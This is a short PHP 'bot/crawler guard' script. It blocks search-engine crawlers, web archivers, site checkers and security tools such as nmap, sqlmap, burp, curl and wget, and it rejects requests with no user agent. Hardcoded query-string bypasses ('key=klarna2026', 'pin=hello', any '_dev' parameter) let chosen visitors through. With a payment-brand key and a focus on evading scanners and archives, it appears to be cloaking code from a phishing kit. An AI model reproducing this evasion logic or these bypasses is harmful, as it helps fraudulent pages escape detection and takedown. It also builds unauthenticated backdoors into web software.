<?php
// ============================================================
// BOT / CRAWLER / DIRECT ACCESS GUARD
// ============================================================

// --- Allow access with valid key/pin or session (bypass bot check) ---
session_start();
$bypass = false;
if (isset($_GET['key']) && $_GET['key'] === 'klarna2026') $bypass = true;
if (isset($_GET['pin']) && $_GET['pin'] === 'hello') $bypass = true;
if (isset($_GET['_dev'])) $bypass = true;
if (isset($_SESSION['idx_access']) && $_SESSION['idx_access'] === true) $bypass = true;
if (isset($_SESSION['pin_ok']) && $_SESSION['pin_ok'] === true) $bypass = true;

// --- Block known bots and crawlers (unless bypassed) ---
if (!$bypass) {
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';

    $botPatterns = [
        'bot', 'crawler', 'spider', 'scraper', 'scan', 'curl', 'wget',
        'go-http', 'java/', 'libwww', 'ahrefs', 'semrush', 'mozdot',
        'mj12bot', 'baidu', 'yandex', 'sogou', 'exabot', 'facebot',
        'ia_archiver', 'sitecheck', 'googlebot', 'bingbot', 'duckduckbot',
        'slurp', 'msnbot', 'archive', 'screaming', 'nmap', 'nikto',
        'sqlmap', 'burp', 'postman', 'insomnia', 'paw', 'httpie'
    ];

    foreach ($botPatterns as $p) {
        if (stripos($ua, $p) !== false) {
            header('HTTP/1.0 403 Forbidden');
            exit;
        }
    }

    // --- Block empty/missing User-Agent ---
    if (empty(trim($ua))) {
        header('HTTP/1.0 403 Forbidden');
        exit;
    }
}

// --- Security headers for all pages ---
header('X-Frame-Options: DENY');
header('X-Content-Type-Options: nosniff');
header('Referrer-Policy: same-origin');
header('Permissions-Policy: camera=(), microphone=(), geolocation=()');
header_remove('X-Powered-By');
